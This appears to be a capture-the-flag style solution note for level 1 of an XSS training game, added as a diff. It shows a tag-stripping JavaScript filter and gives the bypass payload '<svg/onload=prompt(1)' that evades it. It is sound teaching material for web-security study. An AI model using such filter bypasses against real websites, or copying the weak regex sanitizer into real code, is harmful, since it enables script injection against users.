@@ -1,0 +1,21 @@
+Level 1:
+
+function escape(input) {
+    // tags stripping mechanism from ExtJS library
+    // Ext.util.Format.stripTags
+    var stripTagsRE = /<\/?[^>]+>/gi;
+    input = input.replace(stripTagsRE, '');
+
+    return '<article>' + input + '</article>';
+}
+
+
+Solution:- 
+
+
+Note:- If you think to use <script><prompt(1)</script>, then it won't work because <script> is not allowed to work with this level.
+
+
+For this level, You have to use <svg>
+
+Ans-    <svg/onload=prompt(1)  and don't forget to click spacebar after using the command.
